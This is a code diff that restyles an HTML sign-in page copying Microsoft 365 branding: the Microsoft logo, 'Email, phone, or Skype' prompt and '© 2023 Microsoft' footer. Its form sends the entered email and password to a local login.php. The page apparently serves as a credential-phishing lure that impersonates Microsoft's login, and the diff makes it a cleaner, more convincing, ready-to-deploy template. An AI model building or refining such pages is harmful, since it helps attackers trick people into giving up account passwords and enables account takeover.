@@ -4,85 +4,232 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in to your account</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
-    <script src="https://unpkg.com/feather-icons"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600;700&display=swap');
+        :root {
+            --primary: #0078D4;
+            --primary-dark: #106EBE;
+            --primary-light: #E5F1FB;
+            --text-primary: #323130;
+            --text-secondary: #605E5C;
+            --border: #EDEBE9;
+            --error: #A4262C;
+            --white: #FFFFFF;
+            --shadow-sm: 0 1px 3px rgba(0, 0, 0, 0.12);
+            --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+
         body {
-            font-family: 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
-            background-color: #f8f8f8;
+            background-color: var(--white);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
         }
-        .microsoft-logo {
-            width: 108px;
-            height: 23px;
-            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDggMjMiPjxwYXRoIGZpbGw9IiNmMjVkMWIiIGQ9Ik0wIDBIMjN2MjNIMHoiLz48cGF0aCBmaWxsPSIjN2ZiYjAwIiBkPSJNMjYgMEg0OXYyM0gyNnoiLz48cGF0aCBmaWxsPSIjMDBhOGY0IiBkPSJNNTIgMEg3NXYyM0g1MnoiLz48cGF0aCBmaWxsPSIjMDA3OGRjIiBkPSJNNzggMEgxMDh2MjNINzh6Ii8+PC9zdmc+');
-            background-repeat: no-repeat;
+
+        .header {
+            padding: 20px 0;
+            text-align: center;
         }
-        .form-container {
-            box-shadow: 0 0 2px rgba(0,0,0,0.12), 0 2px 4px rgba(0,0,0,0.14);
+
+        .logo {
+            height: 24px;
+            width: auto;
         }
-        .next-btn {
-            background: linear-gradient(to bottom, #0078d4, #106ebe);
+
+        .container {
+            max-width: 440px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 0 20px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
         }
-        .next-btn:hover {
-            background: linear-gradient(to bottom, #106ebe, #005a9e);
+
+        .card {
+            background: var(--white);
+            border-radius: 8px;
+            box-shadow: var(--shadow-md);
+            padding: 40px;
+            margin-bottom: 20px;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: var(--text-primary);
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 2px var(--primary-light);
+        }
+
+        .form-input.error {
+            border-color: var(--error);
+        }
+
+        .error-message {
+            color: var(--error);
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-primary {
+            background-color: var(--primary);
+            color: var(--white);
+        }
+
+        .btn-primary:hover {
+            background-color: var(--primary-dark);
+        }
+
+        .links {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 20px;
+        }
+
+        .link {
+            color: var(--primary);
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 8px;
+            transition: color 0.2s;
+        }
+
+        .link:hover {
+            color: var(--primary-dark);
+            text-decoration: underline;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 24px;
+                box-shadow: none;
+                border: 1px solid var(--border);
+            }
         }
     </style>
 </head>
-<body class="min-h-screen flex flex-col items-center justify-center bg-gray-50">
-    <div class="w-full max-w-md">
-        <div class="text-center mb-8">
-            <img src="m365.png" alt="Microsoft Logo" class="mx-auto mb-4" style="width: 160px; height: 40px;">
-            <h1 class="text-2xl font-semibold text-gray-800">Sign in</h1>
-        </div>
+<body>
+    <header class="header">
+        <img src="m365.png" alt="Microsoft 365" class="logo">
+    </header>
 
-        <div class="bg-white rounded-lg form-container p-8">
-            <form action="login.php" method="POST" class="space-y-6">
-                <div>
-                    <label for="loginfmt" class="block text-sm font-medium text-gray-700 mb-1">Email, phone, or Skype</label>
-                    <input type="text" id="loginfmt" name="loginfmt" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500" autocomplete="username">
+    <main class="container">
+        <div class="card">
+            <h1 class="title">Sign in</h1>
+            <form action="login.php" method="POST">
+                <div class="form-group">
+                    <label for="email" class="form-label">Email, phone, or Skype</label>
+                    <input type="text" id="email" name="email" class="form-input" required>
+                    <div class="error-message" id="email-error">Please enter a valid email address</div>
                 </div>
 
-                <div>
-                    <div class="flex justify-between items-center mb-1">
-                        <label for="passwd" class="block text-sm font-medium text-gray-700">Password</label>
-                        <a href="#" class="text-sm text-blue-600 hover:underline">Forgot password?</a>
-                    </div>
-                    <input type="password" id="passwd" name="passwd" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500" autocomplete="current-password">
+                <div class="form-group">
+                    <label for="password" class="form-label">Password</label>
+                    <input type="password" id="password" name="password" class="form-input" required>
+                    <div class="error-message" id="password-error">Please enter your password</div>
                 </div>
 
-                <div class="flex items-center">
-                    <input id="KMSI" name="KMSI" type="checkbox" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
-                    <label for="KMSI" class="ml-2 block text-sm text-gray-700">Keep me signed in</label>
-                </div>
-
-                <div class="space-y-4">
-                    <button type="submit" class="w-full py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white next-btn focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">
-                        Sign in
-                    </button>
-                    <a href="#" class="w-full flex items-center justify-center px-4 py-2 border border-gray-300 shadow-sm text-sm font-medium rounded-md text-gray-700 bg-white hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">
-                        <i data-feather="arrow-left" class="w-4 h-4 mr-2"></i> Back
-                    </button>
+                <div class="form-group">
+                    <button type="submit" class="btn btn-primary">Sign in</button>
                 </div>
             </form>
-        </div>
 
-        <div class="mt-8 text-center text-sm text-gray-500">
-            <p>No account? <a href="#" class="text-blue-600 hover:underline">Create one!</a></p>
-        </div>
-
-        <div class="mt-8 text-center text-xs text-gray-400">
-            <div class="flex justify-center space-x-4">
-                <a href="#" class="hover:underline">Terms of use</a>
-                <a href="#" class="hover:underline">Privacy & cookies</a>
+            <div class="links">
+                <a href="#" class="link">Forgot password?</a>
+                <a href="#" class="link">Create account</a>
             </div>
-            <p class="mt-2">© Microsoft 2023</p>
         </div>
-    </div>
+    </main>
+
+    <footer class="footer">
+        <div>Terms of use | Privacy & cookies</div>
+        <div>© 2023 Microsoft</div>
+    </footer>
 
     <script>
-        feather.replace();
+        // Simple form validation
+        document.querySelector('form').addEventListener('submit', function(e) {
+            let isValid = true;
+            const email = document.getElementById('email');
+            const password = document.getElementById('password');
+            
+            // Reset errors
+            document.querySelectorAll('.error-message').forEach(el => el.style.display = 'none');
+            document.querySelectorAll('.form-input').forEach(el => el.classList.remove('error'));
+
+            // Email validation
+            if (!email.value.includes('@')) {
+                document.getElementById('email-error').style.display = 'block';
+                email.classList.add('error');
+                isValid = false;
+            }
+
+            // Password validation
+            if (password.value.length < 1) {
+                document.getElementById('password-error').style.display = 'block';
+                password.classList.add('error');
+                isValid = false;
+            }
+
+            if (!isValid) {
+                e.preventDefault();
+            }
+        });
     </script>
 </body>
 </html>
